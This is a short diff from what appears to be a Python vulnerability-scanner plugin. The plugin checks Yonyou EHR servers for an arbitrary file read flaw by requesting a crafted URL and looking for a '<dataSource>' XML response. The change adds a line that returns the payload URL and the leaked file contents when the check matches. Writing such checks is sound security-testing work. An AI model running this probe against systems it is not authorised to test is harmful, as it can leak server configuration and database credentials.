@@ -25,6 +25,7 @@ class yonyou_ehr_ELTextFile_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/xml" and r"<dataSource>" in req.text:
                 cprint("[+]存在用友EHR 任意文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "用友EHR 任意文件读取", payload, req.text
             else:
                 cprint("[-]不存在yonyou_ehr_ELTextFile漏洞", "white", "on_grey")
                 return False, None, None, None, None
